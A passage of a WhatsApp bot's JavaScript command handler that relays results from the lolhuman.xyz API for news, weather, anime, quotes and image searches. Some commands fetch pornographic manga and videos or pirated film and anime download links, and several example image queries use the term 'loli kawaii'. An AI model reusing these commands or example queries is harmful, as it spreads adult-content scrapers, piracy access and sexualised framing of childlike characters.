                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                    case 'tutuptime':
if (!isGroup) return reply(mess.only.group)
if (args[1]==">DETIK") {var timer = args[0]+"000"
} else if (args[1]==">MENIT") {var timer = args[0]+"0000"
} else if (args[1]==">JAM") {var timer = args[0]+"00000"
} else {return reply("*PILIH🗿:*\n>DETIK\n>MENIT\n>JAM\n\n*contoh*\n10 DETIK")}
setTimeout( () => {
var nomor = mek.participant
syaa.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
if (!isGroup) return reply(mess.only.group)
if (args[1]==">DETIK") {var timer = args[0]+"000"
} else if (args[1]==">MENIT") {var timer = args[0]+"0000"
} else if (args[1]==">JAM") {var timer = args[0]+"00000"
} else {return reply("*PILIH🗿:*\n>DETIK\n>MENIT\n>JAM\n\n*contoh*\n10 DETIK")}
setTimeout( () => {
var nomor = mek.participant
syaa.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break					
                case 'nhentai':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(", ")}\n`
                    ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    reply(ini_txt)
                    break
                case 'nhentaipdf':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_buffer = await getBuffer(get_result)
                    await syaa.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
                    break
                case 'nhentaisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `Id : ${x.id}\n`
                        ini_txt += `Title English : ${x.title_english}\n`
                        ini_txt += `Title Japanese : ${x.title_japanese}\n`
                        ini_txt += `Native : ${x.title_native}\n`
                        ini_txt += `Upload : ${x.date_upload}\n`
                        ini_txt += `Page : ${x.page}\n`
                        ini_txt += `Favourite : ${x.favourite}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nekopoi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.anime}\n`
                    ini_txt += `Porducers : ${get_result.producers}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Size : ${get_result.size}\n`
                    ini_txt += `Sinopsis : ${get_result.sinopsis}\n`
                    link = get_result.link
                    for (var x in link) {
                        ini_txt += `\n${link[x].name}\n`
                        link_dl = link[x].link
                        for (var y in link_dl) {
                            ini_txt += `${y} - ${link_dl[y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumb)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'nekopoisearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                    // Information //
                
                case 'brainly2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly2?apikey=${apikey}&query=${args.join(" ")}`)
                    lala = get_result.result
                    ini_txt = "Beberapa Pembahasan Dari Brainly :\n\n"
                    for (var x of lala) {
                        ini_txt += `==============================\n`
                        ini_txt += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
                        ini_txt += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
                        ini_txt += `==============================\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jarak':
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} jakarta dan yogyakarta`)
pauls = args.join(" ")
teks1 = pauls.split("dan")[0].trim()
teks2 = pauls.split("dan")[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${teks1}&kota2=${teks2}`)
x = get_result.result
ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
ini_txt += `   ╭───────────────❏\n`
ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
ini_txt += `❍┤ Mobil : ${x.mobil}\n`
ini_txt += `❍┤ Motor : ${x.motor}\n`
ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
ini_txt += `   ╰───────────────❏\n`
reply(ini_txt)
break
                case 'urbandictionary':
                    urb = args.join(" ")
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/urdict?apikey=${apikey}&query=${urb}`)
                    lilu = get_result.result
                    for (var x of lilu) {
                        ini_txt = `\`\`\`Meaning :\n${x.definition}\`\`\`\n\n`
                        ini_txt += `\`\`\`Link : ${x.permalink}\`\`\`\n\n`
                        ini_txt += `\`\`\`Sounds Url : ${x.sound_urls[0]}\`\`\`\n\n`
                        ini_txt += `\`\`\`Like : ${x.thumbs_up}\`\`\`\n\n`
                        ini_txt += `\`\`\`Dislike : ${x.thumbs_down}\`\`\`\n\n`
                        ini_txt += `\`\`\`Created On : \n${x.written_on}\`\`\`\n\n`
                        ini_txt += `\`\`\`Author : ${x.author}\`\`\`\n\n`
                        ini_txt += `\`\`\`Word : ${x.word}\`\`\`\n\n`
                        ini_txt += `\`\`\`Defined Id : ${x.defid}\`\`\`\n\n`
                        ini_txt += `\`\`\`Example : ${x.example}\`\`\`\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'chord':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/chord?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Chord : \n${get_result.chord}`
                    reply(ini_txt)
                    break
                case 'heroml':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
                    hero = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/heroml/${hero}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.hero_name}\n`
                    ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
                    ini_txt += `Role : ${get_result.detail.role}\n`
                    ini_txt += `Specialty : ${get_result.detail.specialty}\n`
                    ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
                    ini_txt += `Release : ${get_result.detail.release_date}\n`
                    ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
                    ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
                    ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
                    ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
                    ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
                    ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
                    ini_txt += `Hp : ${get_result.attr.hp}\n`
                    ini_txt += `Mana : ${get_result.attr.mana}\n`
                    ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
                    ini_icon = await getBuffer(get_result.icon)
                    await syaa.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    break
                case 'mlstalk':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
                    ml_id = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=${apikey}`)
                    reply(get_result.result)
                    break
                case 'genshin':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
                    hero = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/genshin/${hero}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.title}\n`
                    ini_txt += `Intro : ${get_result.intro}\n`
                    ini_txt += `Icon : ${get_result.icon}\n`
                    ini_icon = await getBuffer(get_result.cover1)
                    await syaa.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    ini_voice = await getBuffer(get_result.cv[0].audio[0])
                    await syaa.sendMessage(from, ini_voice, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
                case 'qrreader':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        const filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/read-qr?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        reply("Result: " + get_result.result)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'wikipedia':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break
                case 'translate':
                    if (args.length == 0) return reply(`Example: ${prefix + command} en Tahu Bacem`)
                    kode_negara = args[0]
                    args.shift()
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${apikey}&text=${ini_txt}`)
                    get_result = get_result.result
                    init_txt = `From : ${get_result.from}\n`
                    init_txt += `To : ${get_result.to}\n`
                    init_txt += `Original : ${get_result.original}\n`
                    init_txt += `Translated : ${get_result.translated}\n`
                    init_txt += `Pronunciation : ${get_result.pronunciation}\n`
                    reply(init_txt)
                    break
                case 'brainly':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Soekarno adalah`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of get_result) {
                        ini_txt += `${x.title}\n`
                        ini_txt += `${x.url}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltv':
                    if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
                    channel = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'jadwaltvnow':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV Now :\n`
                    for (var x in get_result) {
                        ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'newsinfo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnindonesia':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnnasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnninternasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'infogempa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_buffer = await getBuffer(get_result.map)
                    await syaa.sendMessage(from, get_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'lirik':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${query}`)
                    reply(get_result.result)
                    break
                case 'cuaca':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    await syaa.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek })
                    reply(ini_txt)
                    break
                case 'covidindo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'covidglobal':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'kodepos':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                    break
                case 'jadwalbola':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'indbeasiswa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Beasiswa :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'hoax':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Posted : ${x.posted}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nsfwcheck':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        var filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        var form = new FormData();
                        var stats = fs.statSync(filePath);
                        var fileSizeInBytes = stats.size;
                        var fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        var options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nsfwcheck?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        is_nsfw = "No"
                        if (Number(get_result.replace("%", "")) >= 50) is_nsfw = "Yes"
                        reply(`Is NSFW? ${is_nsfw}\nNSFW Score : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'ocr':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        var filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        var form = new FormData();
                        var stats = fs.statSync(filePath);
                        var fileSizeInBytes = stats.size;
                        var fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        var options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/ocr?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        reply(`Result : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break

                    // Movie & Story
                case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break

                    // Random Text //
                case 'quotes':
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${apikey}`)
                    quotes = quotes.result
                    author = quotes.by
                    quotes = quotes.quote
                    reply(`_${quotes}_\n\n*― ${author}*`)
                    break
                case 'quotesanime':
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apikey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
                    quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${apikey}`)
                    reply(quotedilan.result)
                    break
                case 'quotesimage':
                    get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
                    await syaa.sendMessage(from, get_result, image, { quotes: lol })
                    break
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
                    reply(get_result.result)
                    break
                case 'randomnama':
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`)
                    reply(anu.result)
                    break

                    // Searching
                case 'gimage':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${apikey}&query=${query}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'gimage2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gimage2?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await syaa.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'konachan':
                    if (args.length == 0) return reply(`Example: ${prefix + command} azur_lane`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=${apikey}&query=${query}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'wallpapersearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${apikey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'wallpapersearch2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper2?apikey=${apikey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
